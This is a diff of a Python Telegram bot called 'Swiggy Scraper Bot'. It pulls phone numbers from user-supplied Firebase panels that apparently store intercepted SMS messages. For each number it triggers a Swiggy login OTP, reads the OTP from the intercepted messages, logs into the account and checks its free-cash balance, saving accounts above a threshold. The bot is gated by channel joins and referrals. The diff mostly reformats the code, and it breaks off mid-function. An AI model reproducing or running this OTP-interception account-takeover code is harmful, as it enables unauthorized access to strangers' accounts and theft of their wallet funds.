@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 Swiggy TG Bot — Private Panel Per User
-- Flow: /start → Join Channels → Share Referral → Unlock → Add YOUR Panel → Scan
+- Flow: /start -> Join Channels -> Share Referral -> Unlock -> Add YOUR Panel -> Scan
 - Each user uploads and manages their OWN panels only
 - No panel sharing between users — fully isolated
 - 15 workers per user, private aiohttp session
@@ -56,9 +56,9 @@ BOT_TOKEN = os.environ.get("BOT_TOKEN", "8646908060:AAGTZni_boQhI8h4gFBpTh0z2kW0
 ADMIN_IDS = {1446058092, 6894923643}
 
 REQUIRED_CHANNELS = [
-    {"username": "blankkdealz",     "url": "https://t.me/blankkdealz",      "label": "📢 Blank Dealz"},
-    {"username": "earnwithsakx",    "url": "https://t.me/earnwithsakx",     "label": "💰 Earn With Sakx"},
-    {"username": "blankdealzzchat", "url": "https://t.me/blankdealzzchat",  "label": "💬 Blank Dealz Chat"},
+    {"username": "blankkdealz", "url": "https://t.me/blankkdealz", "label": "Blank Dealz"},
+    {"username": "earnwithsakx", "url": "https://t.me/earnwithsakx", "label": "Earn With Sakx"},
+    {"username": "blankdealzzchat", "url": "https://t.me/blankdealzzchat", "label": "Blank Dealz Chat"},
 ]
 
 DEFAULT_CAMPAIGN_ID = "ougwl_MjU3MTUyNzI0I1JhaHVs"
@@ -70,12 +70,12 @@ POLL_INTERVAL = 0.5
 REFERRALS_FOR_1H = 3
 ACCESS_HOURS = 1
 
-STATE_FILE  = Path(__file__).parent / "bot_state.json"
-USERS_FILE  = Path(__file__).parent / "users.json"
-# Per-user panels: { uid_str: { panel_id: {api_url, auth_key, name, ...}, ... } }
+STATE_FILE = Path(__file__).parent / "bot_state.json"
+USERS_FILE = Path(__file__).parent / "users.json"
 USER_PANELS_FILE = Path(__file__).parent / "user_panels.json"
 RESULTS_DIR = Path(__file__).parent / "results"
 RESULTS_DIR.mkdir(exist_ok=True)
+
 
 # ── JSON helpers ───────────────────────────────────────────────────────────────
 def load_json(path, default):
@@ -87,6 +87,7 @@ def load_json(path, default):
             logger.error(f"Error loading {path}: {e}")
     return default
 
+
 def save_json(path, data):
     try:
         with open(path, "w") as f:
@@ -94,26 +95,30 @@ def save_json(path, data):
     except Exception as e:
         logger.error(f"Error saving {path}: {e}")
 
+
 def load_state():
     return load_json(STATE_FILE, {})
+
+
 def save_state(s):
     save_json(STATE_FILE, s)
 
-# ── Per-user panels (PRIVATE — no sharing) ────────────────────────────────────
+
+# ── Per-user panels (PRIVATE) ─────────────────────────────────────────────────
 def load_user_panels() -> dict:
-    """Returns { uid_str: { panel_id: {...}, ... } }"""
     return load_json(USER_PANELS_FILE, {})
+
 
 def save_user_panels(data: dict):
     save_json(USER_PANELS_FILE, data)
 
+
 def get_user_panels(uid: int) -> dict:
-    """Get panels for a specific user only."""
     all_panels = load_user_panels()
     return all_panels.get(str(uid), {})
 
+
 def add_user_panel(uid: int, panel_data: dict) -> str:
-    """Add a panel to a specific user. Returns panel_id."""
     all_panels = load_user_panels()
     uid_str = str(uid)
     if uid_str not in all_panels:
@@ -123,8 +128,8 @@ def add_user_panel(uid: int, panel_data: dict) -> str:
     save_user_panels(all_panels)
     return pid
 
+
 def remove_user_panel(uid: int, panel_id: str) -> bool:
-    """Remove a specific panel from a user."""
     all_panels = load_user_panels()
     uid_str = str(uid)
     if uid_str in all_panels and panel_id in all_panels[uid_str]:
@@ -133,15 +138,19 @@ def remove_user_panel(uid: int, panel_id: str) -> bool:
         return True
     return False
 
+
 # ── User management ────────────────────────────────────────────────────────────
 def load_users() -> dict:
     return load_json(USERS_FILE, {})
 
+
 def save_users(u: dict):
     save_json(USERS_FILE, u)
 
+
 def get_user(uid: int) -> dict | None:
     return load_users().get(str(uid))
+
 
 def upsert_user(uid: int, **kwargs):
     users = load_users()
@@ -158,6 +167,7 @@ def upsert_user(uid: int, **kwargs):
     save_users(users)
     return users[key]
 
+
 def has_access(uid: int) -> bool:
     if uid in ADMIN_IDS:
         return True
@@ -165,6 +175,7 @@ def has_access(uid: int) -> bool:
     if not u:
         return False
     return u.get("access_expiry", 0) > time.time()
+
 
 def grant_access_hours(uid: int, hours: int = ACCESS_HOURS) -> float:
     u = get_user(uid)
@@ -174,8 +185,10 @@ def grant_access_hours(uid: int, hours: int = ACCESS_HOURS) -> float:
     upsert_user(uid, access_expiry=new_expiry)
     return new_expiry
 
+
 def get_all_user_ids() -> list[int]:
     return [int(k) for k in load_users().keys()]
+
 
 # ── Channel membership ─────────────────────────────────────────────────────────
 async def check_channels(bot, uid: int) -> list[dict]:
@@ -189,14 +202,15 @@ async def check_channels(bot, uid: int) -> list[dict]:
             not_joined.append(ch)
     return not_joined
 
+
 def channel_join_keyboard(not_joined: list[dict]) -> InlineKeyboardMarkup:
     buttons = [[InlineKeyboardButton(ch["label"], url=ch["url"])] for ch in not_joined]
-    buttons.append([InlineKeyboardButton("✅ I've Joined — Check", callback_data="check_join")])
+    buttons.append([InlineKeyboardButton("I've Joined - Check", callback_data="check_join")])
     return InlineKeyboardMarkup(buttons)
+
 
 # ── Per-User Session Manager ───────────────────────────────────────────────────
 class UserSession:
-    """Each member gets their own isolated session + 15 workers."""
     def __init__(self, uid: int):
         self.uid = uid
         self.semaphore = asyncio.Semaphore(DEFAULT_WORKERS)
@@ -227,6 +241,7 @@ class UserSession:
         self.total_scanned = 0
         self.total_found = 0
 
+
 class SessionManager:
     def __init__(self):
         self._sessions: Dict[int, UserSession] = {}
@@ -246,22 +261,29 @@ class SessionManager:
             await us.close()
         self._sessions.clear()
 
+
 session_manager = SessionManager()
+
 
 # ── Swiggy API Helpers ─────────────────────────────────────────────────────────
 def generate_csrf() -> str:
-    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
-    return ''.join(random.choices(chars, k=40))
+    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    return "".join(random.choices(chars, k=40))
+
 
 def generate_uuid() -> str:
     return str(uuid.uuid4())
 
-def random_user_agent() -> str:
-    return ("Mozilla/5.0 (Linux; Android 14; SM-A065F Build/UP1A.231005.007; wv) "
-            "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 "
-            "Chrome/150.0.7871.181 Mobile Safari/537.36")
 
-# ── Firebase URL Normalization (bug-fixed) ─────────────────────────────────────
+def random_user_agent() -> str:
+    return (
+        "Mozilla/5.0 (Linux; Android 14; SM-A065F Build/UP1A.231005.007; wv) "
+        "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 "
+        "Chrome/150.0.7871.181 Mobile Safari/537.36"
+    )
+
+
+# ── Firebase URL Normalization ─────────────────────────────────────────────────
 def _normalize_firebase_url(url: str, key: str = "") -> tuple:
     url = url.strip().rstrip("/")
     if url.startswith("http"):
@@ -273,18 +295,17 @@ def _normalize_firebase_url(url: str, key: str = "") -> tuple:
                     key = v[0]
                     break
         api_url = (parsed.scheme + "://" + parsed.netloc + parsed.path).rstrip("/")
-        # Never let key be a URL
         if key.startswith("http"):
             key = ""
         return api_url, key
     else:
-        # Short project ID — prevent double -default-rtdb
         if url.endswith("-default-rtdb"):
             return f"https://{url}.firebaseio.com", key
         elif ".firebaseio.com" in url or ".firebasedatabase.app" in url:
             return f"https://{url}", key
         else:
             return f"https://{url}-default-rtdb.firebaseio.com", key
+
 
 def decode_merge_panels(panel_url: str) -> list:
     parsed = urllib.parse.urlparse(panel_url)
@@ -333,6 +354,7 @@ def decode_merge_panels(panel_url: str) -> list:
         logger.error(f"decode_merge_panels parse error: {e}")
     return panels
 
+
 def get_panel_api_url(panel_url: str):
     parsed_pre = urllib.parse.urlparse(panel_url)
     if parsed_pre.fragment.startswith("merge="):
@@ -349,8 +371,8 @@ def get_panel_api_url(panel_url: str):
     if s_param:
         s_param_padded = s_param + "=" * ((4 - len(s_param) % 4) % 4)
         try:
-            decoded = base64.b64decode(s_param_padded).decode('utf-8')
-            for sep in ['|||', '|']:
+            decoded = base64.b64decode(s_param_padded).decode("utf-8")
+            for sep in ["|||", "|"]:
                 if sep in decoded:
                     parts = decoded.split(sep)
                     if len(parts) >= 2:
@@ -382,6 +404,7 @@ def get_panel_api_url(panel_url: str):
         auth_key = ""
     return url, auth_key
 
+
 # ── Firebase async helpers ─────────────────────────────────────────────────────
 def fb_url(base: str, auth_key: str = "", **extra) -> str:
     params = {}
@@ -396,6 +419,7 @@ def fb_url(base: str, auth_key: str = "", **extra) -> str:
     sep = "&" if "?" in base else "?"
     return base + sep + "&".join(f"{k}={v}" for k, v in params.items())
 
+
 async def fb_fetch(client: httpx.AsyncClient, url: str, timeout: int = 10):
     try:
         resp = await client.get(url, timeout=timeout)
@@ -405,8 +429,10 @@ async def fb_fetch(client: httpx.AsyncClient, url: str, timeout: int = 10):
     except Exception as e:
         return None, str(e)
 
-async def fetch_phones_async(client: httpx.AsyncClient, api_url: str, auth_key: str, limit: int = 100) -> List[Tuple[str, str]]:
-    """Fetch phones from a user's private panel."""
+
+async def fetch_phones_async(
+    client: httpx.AsyncClient, api_url: str, auth_key: str, limit: int = 100
+) -> List[Tuple[str, str]]:
     if not api_url:
         return []
     base = api_url.rstrip("/") + "/"
@@ -423,25 +449,33 @@ async def fetch_phones_async(client: httpx.AsyncClient, api_url: str, auth_key: 
             break
         if not isinstance(c_data, dict):
             continue
-        phone = (c_data.get("mobNo") or c_data.get("phone") or
-                 c_data.get("mobile") or c_data.get("number") or
-                 c_data.get("phoneNumber") or "")
+        phone = (
+            c_data.get("mobNo")
+            or c_data.get("phone")
+            or c_data.get("mobile")
+            or c_data.get("number")
+            or c_data.get("phoneNumber")
+            or ""
+        )
         if phone:
-            phone = re.sub(r'\D', '', str(phone))
+            phone = re.sub(r"\D", "", str(phone))
             if len(phone) == 10 and phone[0] in "6789":
                 phones.append((phone, c_id))
                 continue
-        msgs_data, _ = await fb_fetch(client, fb_url(f"{base}messages/{c_id}/.json", auth_key))
+        msgs_data, _ = await fb_fetch(
+            client, fb_url(f"{base}messages/{c_id}/.json", auth_key)
+        )
         if msgs_data and isinstance(msgs_data, dict):
             for msg in msgs_data.values():
                 if not isinstance(msg, dict):
                     continue
                 text = str(msg.get("body") or msg.get("message") or msg.get("text") or "")
-                match = re.search(r'\b([6-9]\d{9})\b', text)
+                match = re.search(r"\b([6-9]\d{9})\b", text)
                 if match:
                     phones.append((match.group(1), c_id))
                     break
     return phones
+
 
 # ── OTP Poller ─────────────────────────────────────────────────────────────────
 async def poll_otp_from_panel(
@@ -457,14 +491,16 @@ async def poll_otp_from_panel(
     if trigger_time is None:
         trigger_time = int(time.time() * 1000)
     start = time.time()
-    base_url = firebase_url.rstrip('/') + '/'
+    base_url = firebase_url.rstrip("/") + "/"
 
     while time.time() - start < timeout:
         try:
             url = f"{base_url}messages/{device_id}.json"
             if api_key:
                 url += f"?auth={api_key}"
-            async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
+            async with session.get(
+                url, timeout=aiohttp.ClientTimeout(total=5)
+            ) as resp:
                 if resp.status != 200:
                     await asyncio.sleep(poll_interval)
                     continue
@@ -477,7 +513,14 @@ async def poll_otp_from_panel(
                     if not isinstance(msg_data, dict):
                         continue
                     msg_ts = None
-                    for field in ["timestamp", "time", "sentTimestamp", "date", "createdAt", "id"]:
+                    for field in [
+                        "timestamp",
+                        "time",
+                        "sentTimestamp",
+                        "date",
+                        "createdAt",
+                        "id",
+                    ]:
                         if field in msg_data and msg_data[field]:
                             try:
                                 msg_ts = int(msg_data[field])
@@ -496,10 +539,10 @@ async def poll_otp_from_panel(
                     sender = msg_data.get("sender", "")
                     if sender_keyword.lower() in sender.lower():
                         body = msg_data.get("body") or msg_data.get("message") or ""
-                        otp_match = re.search(r'OTP\s*(\d{4,6})', body, re.IGNORECASE)
+                        otp_match = re.search(r"OTP\s*(\d{4,6})", body, re.IGNORECASE)
                         if otp_match:
                             return otp_match.group(1)
-                        fallback = re.search(r'(?<!\d)(\d{4,6})(?!\d)', body)
+                        fallback = re.search(r"(?<!\d)(\d{4,6})(?!\d)", body)
                         if fallback:
                             return fallback.group(1)
                 await asyncio.sleep(poll_interval)
@@ -508,6 +551,7 @@ async def poll_otp_from_panel(
         except Exception:
             await asyncio.sleep(poll_interval)
     return None
+
 
 # ── Swiggy Client ──────────────────────────────────────────────────────────────
 class SwiggyClient:
@@ -521,14 +565,14 @@ class SwiggyClient:
 
     def _build_headers(self, extra: dict = None) -> dict:
         headers = {
-            'accept': '*/*',
-            'content-type': 'application/json',
-            'origin': 'https://www.swiggy.com',
-            'referer': 'https://www.swiggy.com/auth',
-            'sec-ch-ua': '"Android WebView";v="149", "Chromium";v="149"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'user-agent': random_user_agent(),
+            "accept": "*/*",
+            "content-type": "application/json",
+            "origin": "https://www.swiggy.com",
+            "referer": "https://www.swiggy.com/auth",
+            "sec-ch-ua": '"Android WebView";v="149", "Chromium";v="149"',
+            "sec-ch-ua-mobile": "?1",
+            "sec-ch-ua-platform": '"Android"',
+            "user-agent": random_user_agent(),
         }
         if extra:
             headers.update(extra)
@@ -536,14 +580,23 @@ class SwiggyClient:
 
     async def send_otp(self, phone: str) -> bool:
         signin_url = "https://www.swiggy.com/mapi/auth/signin-check"
-        signin_data = {"mobile": phone, "countryCode": "91", "countryKey": "IN", "_csrf": self.csrf}
+        signin_data = {
+            "mobile": phone,
+            "countryCode": "91",
+            "countryKey": "IN",
+            "_csrf": self.csrf,
+        }
         try:
-            async with self.session.post(signin_url, json=signin_data, headers=self._build_headers(),
-                                         timeout=aiohttp.ClientTimeout(total=10)) as resp:
+            async with self.session.post(
+                signin_url,
+                json=signin_data,
+                headers=self._build_headers(),
+                timeout=aiohttp.ClientTimeout(total=10),
+            ) as resp:
                 if resp.status != 200:
                     return False
                 data = await resp.json()
-                if not data.get('data', {}).get('registered', False):
+                if not data.get("data", {}).get("registered", False):
                     return False
         except Exception:
             return False
@@ -551,8 +604,12 @@ class SwiggyClient:
         otp_url = "https://www.swiggy.com/mapi/auth/sms-otp"
         otp_data = {"mobile": phone, "_csrf": self.csrf}
         try:
-            async with self.session.post(otp_url, json=otp_data, headers=self._build_headers(),
-                                         timeout=aiohttp.ClientTimeout(total=10)) as resp:
+            async with self.session.post(
+                otp_url,
+                json=otp_data,
+                headers=self._build_headers(),
+                timeout=aiohttp.ClientTimeout(total=10),
+            ) as resp:
                 return resp.status == 200
         except Exception:
             return False
@@ -561,16 +618,20 @@ class SwiggyClient:
         verify_url = "https://www.swiggy.com/mapi/auth/otp-verify"
         verify_data = {"otp": otp, "_csrf": self.csrf}
         try:
-            async with self.session.post(verify_url, json=verify_data, headers=self._build_headers(),
-                                         timeout=aiohttp.ClientTimeout(total=10)) as resp:
+            async with self.session.post(
+                verify_url,
+                json=verify_data,
+                headers=self._build_headers(),
+                timeout=aiohttp.ClientTimeout(total=10),
+            ) as resp:
                 if resp.status != 200:
                     return False
                 data = await resp.json()
-                if data.get('statusCode') != 0:
+                if data.get("statusCode") != 0:
                     return False
-                self.token = data.get('data', {}).get('token')
-                self.tid = data.get('tid')
-                self.user_id = str(data.get('data', {}).get('customer_id'))
+                self.token = data.get("data", {}).get("token")
+                self.tid = data.get("tid")
+                self.user_id = str(data.get("data", {}).get("customer_id"))
                 return bool(self.token and self.tid)
         except Exception:
             return False
@@ -580,47 +641,58 @@ class SwiggyClient:
             return None
         url = "https://spns.swiggy.com/api/v1/campaign/rewards"
         headers = {
-            'client-id': 'portal',
-            'tid': self.tid,
-            'token': self.token,
-            'user-agent': random_user_agent(),
-            'content-type': 'application/json',
-            'accept': '*/*',
-            'origin': 'https://webviews.swiggy.com',
-            'x-requested-with': 'in.swiggy.android',
-            'referer': 'https://webviews.swiggy.com/',
+            "client-id": "portal",
+            "tid": self.tid,
+            "token": self.token,
+            "user-agent": random_user_agent(),
+            "content-type": "application/json",
+            "accept": "*/*",
+            "origin": "https://webviews.swiggy.com",
+            "x-requested-with": "in.swiggy.android",
+            "referer": "https://webviews.swiggy.com/",
         }
         payload = {
             "generalContext": {"requestContext": {"clientId": "portal_invite"}},
-            "campaignRewardRequests": [{
-                "campaignType": "CAMPAIGN_TYPE_BUZZ_MONEY_STREAKS",
-                "campaignId": campaign_id,
-                "rollingFreecashParams": {
-                    "forceRefresh": True,
-                    "requestParams": {
-                        "dataRequested": "wallet,connections,transactions",
-                        "consumerName": "User",
-                        "source": "invite"
-                    }
+            "campaignRewardRequests": [
+                {
+                    "campaignType": "CAMPAIGN_TYPE_BUZZ_MONEY_STREAKS",
+                    "campaignId": campaign_id,
+                    "rollingFreecashParams": {
+                        "forceRefresh": True,
+                        "requestParams": {
+                            "dataRequested": "wallet,connections,transactions",
+                            "consumerName": "User",
+                            "source": "invite",
+                        },
+                    },
                 }
-            }]
+            ],
         }
         try:
-            async with self.session.post(url, json=payload, headers=headers,
-                                         timeout=aiohttp.ClientTimeout(total=15)) as resp:
+            async with self.session.post(
+                url,
+                json=payload,
+                headers=headers,
+                timeout=aiohttp.ClientTimeout(total=15),
+            ) as resp:
                 if resp.status != 200:
                     return None
                 data = await resp.json()
-                if data.get('statusCode') != 0:
+                if data.get("statusCode") != 0:
                     return None
-                reward_responses = data.get('data', {}).get('campaignRewardResponses', [])
+                reward_responses = data.get("data", {}).get(
+                    "campaignRewardResponses", []
+                )
                 if not reward_responses:
                     return None
-                rewards = reward_responses[0].get('rewards', [])
+                rewards = reward_responses[0].get("rewards", [])
                 for reward in rewards:
-                    if reward.get('rewardType') == 'REWARD_TYPE_ROLLING_FREECASH':
-                        total_str = reward.get('rollingFreecash', {}).get(
-                            'totalEarned', {}).get('units', '0')
+                    if reward.get("rewardType") == "REWARD_TYPE_ROLLING_FREECASH":
+                        total_str = (
+                            reward.get("rollingFreecash", {})
+                            .get("totalEarned", {})
+                            .get("units", "0")
+                        )
                         try:
                             return int(total_str)
                         except (ValueError, TypeError):
@@ -628,6 +700,7 @@ class SwiggyClient:
                 return 0
         except Exception:
             return None
+
 
 # ── Process one phone ──────────────────────────────────────────────────────────
 async def process_phone(
@@ -647,7 +720,7 @@ async def process_phone(
 
         if not await client.send_otp(phone):
             if progress_callback:
-                await progress_callback(phone, "❌ OTP failed")
+                await progress_callback(phone, "OTP failed")
             return None
 
         trigger_time = int(time.time() * 1000)
@@ -661,12 +734,12 @@ async def process_phone(
         )
         if not otp:
             if progress_callback:
-                await progress_callback(phone, "⏰ OTP timeout")
+                await progress_callback(phone, "OTP timeout")
             return None
 
         if not await client.verify_otp(phone, otp):
             if progress_callback:
-                await progress_callback(phone, "❌ Verify failed")
+                await progress_callback(phone, "Verify failed")
             return None
 
         free_cash = await client.get_free_cash(campaign_id)
@@ -674,7 +747,7 @@ async def process_phone(
 
         if free_cash is None:
             if progress_callback:
-                await progress_callback(phone, "❌ Cash error")
+                await progress_callback(phone, "Cash error")
             return None
 
         if free_cash >= threshold:
@@ -689,12 +762,13 @@ async def process_phone(
             }
             user_session.results.append(result)
             if progress_callback:
-                await progress_callback(phone, f"✅ ₹{free_cash}")
+                await progress_callback(phone, f"FOUND {free_cash}")
             return result
         else:
             if progress_callback:
-                await progress_callback(phone, f"₹{free_cash}")
+                await progress_callback(phone, f"low {free_cash}")
             return None
+
 
 # ── Run scraper for a user ────────────────────────────────────────────────────
 async def run_scraper(
@@ -712,12 +786,11 @@ async def run_scraper(
     us.is_running = True
     us.reset_results()
 
-    # Load THIS user's panels only
     my_panels = get_user_panels(uid)
     panel_config = my_panels.get(panel_key)
     if not panel_config:
         try:
-            await app.bot.send_message(uid, "❌ Panel not found. It may have been removed.")
+            await app.bot.send_message(uid, "Panel not found. It may have been removed.")
         except Exception:
             pass
         us.is_running = False
@@ -725,21 +798,17 @@ async def run_scraper(
 
     api_url = panel_config.get("api_url", "")
     auth_key = panel_config.get("auth_key", "")
+    panel_name = panel_config.get("name", "Unknown")
 
     status_msg = None
     try:
         status_msg = await app.bot.send_message(
             uid,
-            f"🔍 *Scraper Starting...*
-"
-            f"Panel: {panel_config.get('name', 'Unknown')}
-"
-            f"Threshold: ₹{threshold}
-"
-            f"Workers: {DEFAULT_WORKERS}
-"
-            f"Fetching phones...",
-            parse_mode="Markdown",
+            f"""Scraper Starting...
+Panel: {panel_name}
+Threshold: Rs {threshold}
+Workers: {DEFAULT_WORKERS}
+Fetching phones...""",
         )
     except Exception:
         pass
@@ -750,7 +819,9 @@ async def run_scraper(
 
     if not phones:
         try:
-            await app.bot.send_message(uid, "❌ No phones found in your panel. Check your panel link.")
+            await app.bot.send_message(
+                uid, "No phones found in your panel. Check your panel link."
+            )
         except Exception:
             pass
         us.is_running = False
@@ -767,25 +838,21 @@ async def run_scraper(
         last_update = now
         try:
             text = (
-                f"⏳ *Scanning...*
-"
-                f"━━━━━━━━━━━━━━━━━━━━━━
-"
-                f"📱 Scanned: {us.total_scanned}/{total}
-"
-                f"✅ Found: {us.total_found}
-"
-                f"🔄 Last: `{phone}` → {status}
-"
-                f"━━━━━━━━━━━━━━━━━━━━━━"
+                f"Scanning...\n"
+                f"Scanned: {us.total_scanned}/{total}\n"
+                f"Found: {us.total_found}\n"
+                f"Last: {phone} -> {status}"
             )
             if status_msg:
-                await app.bot.edit_message_text(text, uid, status_msg.message_id, parse_mode="Markdown")
+                await app.bot.edit_message_text(text, uid, status_msg.message_id)
         except Exception:
             pass
 
     tasks = [
-        process_phone(phone, device, api_url, auth_key, sender_keyword, campaign_id, threshold, us, on_progress)
+        process_phone(
+            phone, device, api_url, auth_key,
+            sender_keyword, campaign_id, threshold, us, on_progress
+        )
         for phone, device in phones
     ]
 
@@ -794,48 +861,38 @@ async def run_scraper(
     except asyncio.CancelledError:
         pass
 
-    # Save results
     if us.results:
         filename = RESULTS_DIR / f"uid{uid}_{int(time.time())}.csv"
-        with open(filename, 'w', newline='', encoding='utf-8') as f:
+        with open(filename, "w", newline="", encoding="utf-8") as f:
             writer = csv.DictWriter(f, fieldnames=us.results[0].keys())
             writer.writeheader()
             writer.writerows(us.results)
 
-    result_text = (
-        f"🏁 *Scan Complete!*
-"
-        f"━━━━━━━━━━━━━━━━━━━━━━
-"
-        f"📱 Total Scanned: {us.total_scanned}
-"
-        f"✅ Found (≥₹{threshold}): {us.total_found}
-"
-        f"━━━━━━━━━━━━━━━━━━━━━━
-"
-    )
+    lines = [
+        f"Scan Complete!",
+        f"Total Scanned: {us.total_scanned}",
+        f"Found (>=Rs {threshold}): {us.total_found}",
+    ]
     if us.results:
-        result_text += "
-🏆 *Good Accounts:*
-"
+        lines.append("")
+        lines.append("Good Accounts:")
         for r in us.results[:20]:
-            result_text += f"  • `{r['phone']}` → ₹{r['free_cash']}
-"
+            lines.append(f"  {r['phone']} -> Rs {r['free_cash']}")
         if len(us.results) > 20:
-            result_text += f"  ...and {len(us.results) - 20} more
-"
-        result_text += f"
-📁 Full results saved to CSV"
+            lines.append(f"  ...and {len(us.results) - 20} more")
+        lines.append("")
+        lines.append("Full results saved to CSV")
     else:
-        result_text += "
-❌ No qualifying accounts found"
+        lines.append("")
+        lines.append("No qualifying accounts found")
 
     try:
-        await app.bot.send_message(uid, result_text, parse_mode="Markdown")
+        await app.bot.send_message(uid, "\n".join(lines))
     except Exception:
         pass
 
     us.is_running = False
+
 
 # ── /start ─────────────────────────────────────────────────────────────────────
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -845,7 +902,7 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     upsert_user(uid, username=username)
 
-    # ── Referral handling ──────────────────────────────────────────────────────
+    # Referral handling
     if args and args[0].startswith("r"):
         try:
             referrer_id = int(args[0][1:])
@@ -860,54 +917,48 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                         upsert_user(referrer_id, referrals_given=new_refs)
                         if new_refs % REFERRALS_FOR_1H == 0:
                             expiry = grant_access_hours(referrer_id, ACCESS_HOURS)
-                            exp_str = datetime.fromtimestamp(expiry).strftime("%H:%M %d/%m")
+                            exp_str = datetime.fromtimestamp(expiry).strftime(
+                                "%H:%M %d/%m"
+                            )
                             try:
                                 await context.bot.send_message(
                                     referrer_id,
-                                    f"🎉 *Congratulations!*
-"
-                                    f"Tumhare {new_refs} referrals ho gaye!
-"
-                                    f"✅ *1 ghante ka access mil gaya!*
-"
-                                    f"Expires: `{exp_str}`",
-                                    parse_mode="Markdown",
+                                    f"""Congratulations!
+Your {new_refs} referrals are done!
+1 hour access granted!
+Expires: {exp_str}""",
                                 )
                             except Exception:
                                 pass
                         else:
-                            remaining = REFERRALS_FOR_1H - (new_refs % REFERRALS_FOR_1H)
+                            remaining = REFERRALS_FOR_1H - (
+                                new_refs % REFERRALS_FOR_1H
+                            )
                             try:
                                 await context.bot.send_message(
                                     referrer_id,
-                                    f"👥 *New referral!*
-"
-                                    f"Total: {new_refs} | Aur {remaining} chahiye access ke liye",
-                                    parse_mode="Markdown",
+                                    f"""New referral!
+Total: {new_refs} | {remaining} more needed for access""",
                                 )
                             except Exception:
                                 pass
         except (ValueError, IndexError):
             pass
 
-    # ── Step 1: Check channel join ────────────────────────────────────────────
+    # Step 1: Check channel join
     if uid not in ADMIN_IDS:
         not_joined = await check_channels(context.bot, uid)
         if not_joined:
             kb = channel_join_keyboard(not_joined)
             await update.message.reply_text(
-                "👋 *Welcome to Swiggy Scraper Bot!*
+                """Welcome to Swiggy Scraper Bot!
 
-"
-                "📢 *Step 1:* Pehle in channels ko join karo,
-"
-                "phir bot use kar sakte ho:",
-                parse_mode="Markdown",
+Step 1: Join these channels first, then you can use the bot:""",
                 reply_markup=kb,
             )
             return
 
-    # ── Step 2: Check access (referral gate) ──────────────────────────────────
+    # Step 2: Check access (referral gate)
     if uid not in ADMIN_IDS and not has_access(uid):
         bot_info = await context.bot.get_me()
         ref_link = f"https://t.me/{bot_info.username}?start=r{uid}"
@@ -916,33 +967,24 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         needed = REFERRALS_FOR_1H - (refs % REFERRALS_FOR_1H)
 
         await update.message.reply_text(
-            f"✅ *Channels joined!*
+            f"""Channels joined!
 
-"
-            f"🔗 *Step 2:* Share your referral link to unlock the bot.
+Step 2: Share your referral link to unlock the bot.
 
-"
-            f"━━━━━━━━━━━━━━━━━━━━━━
-"
-            f"📲 *Your Referral Link:*
-"
-            f"`{ref_link}`
+Your Referral Link:
+{ref_link}
 
-"
-            f"👥 Current referrals: `{refs}`
-"
-            f"Aur *{needed}* aur chahiye = 1 ghanta access
+Current referrals: {refs}
+{needed} more needed = 1 hour access
 
-"
-            f"💡 Har 3 referrals = 1 ghante ka access!
-"
-            f"Share karo aur bot unlock karo 🚀",
-            parse_mode="Markdown",
+Every 3 referrals = 1 hour access!
+Share and unlock the bot!""",
         )
         return
 
-    # ── Step 3: Has access — show main menu ───────────────────────────────────
+    # Step 3: Has access — show main menu
     await show_main_menu(update, context)
+
 
 # ── Main menu ──────────────────────────────────────────────────────────────────
 async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -960,48 +1002,40 @@ async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     expiry = u.get("access_expiry", 0) if u else 0
 
     if is_admin:
-        access_str = "♾ Unlimited (Admin)"
+        access_str = "Unlimited (Admin)"
     elif expiry > time.time():
         exp_str = datetime.fromtimestamp(expiry).strftime("%H:%M %d/%m/%Y")
-        access_str = f"✅ Active till {exp_str}"
+        access_str = f"Active till {exp_str}"
     else:
         needed = REFERRALS_FOR_1H - (refs % REFERRALS_FOR_1H)
-        access_str = f"⛔ Expired | {needed} more refer needed"
+        access_str = f"Expired | {needed} more refer needed"
 
     keyboard = ReplyKeyboardMarkup(
-        [["🔍 Start Scan", "⏹ Stop Scan"],
-         ["➕ Add My Panel", "❌ Remove My Panel"],
-         ["📋 My Panels", "📊 My Status"],
-         ["🔗 My Referral", "⏳ My Access"]],
+        [
+            ["Start Scan", "Stop Scan"],
+            ["Add My Panel", "Remove My Panel"],
+            ["My Panels", "My Status"],
+            ["My Referral", "My Access"],
+        ],
         resize_keyboard=True,
     )
 
-    role = "👑 *Admin*" if is_admin else "👤 *Member*"
+    role = "Admin" if is_admin else "Member"
 
     await update.effective_message.reply_text(
-        f"🛒 *Swiggy Scraper Bot*
-"
-        f"━━━━━━━━━━━━━━━━━━━━━━
-"
-        f"Role: {role}
-"
-        f"Access: {access_str}
-"
-        f"📦 Your Panels: {panel_count}
-"
-        f"👥 Referrals: {refs}
-"
-        f"━━━━━━━━━━━━━━━━━━━━━━
-"
-        f"🔒 *Your panels are PRIVATE*
-"
-        f"Nobody else can see or use them.
+        f"""Swiggy Scraper Bot
+====================
+Role: {role}
+Access: {access_str}
+Your Panels: {panel_count}
+Referrals: {refs}
+====================
+Your panels are PRIVATE - nobody else can see or use them.
 
-"
-        f"🔗 Referral: `{ref_link}`",
-        parse_mode="Markdown",
+Referral: {ref_link}""",
         reply_markup=keyboard,
     )
+
 
 # ── Check join callback ────────────────────────────────────────────────────────
 async def check_join_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1013,8 +1047,7 @@ async def check_join_callback(update: Update, context: ContextTypes.DEFAULT_TYPE
     if not_joined:
         kb = channel_join_keyboard(not_joined)
         await query.edit_message_text(
-            "❌ *Abhi bhi kuch channels join nahi kiye:*",
-            parse_mode="Markdown",
+            "Still not joined all channels:",
             reply_markup=kb,
         )
     else:
@@ -1027,88 +1060,78 @@ async def check_join_callback(update: Update, context: ContextTypes.DEFAULT_TYPE
             needed = REFERRALS_FOR_1H - (refs % REFERRALS_FOR_1H)
 
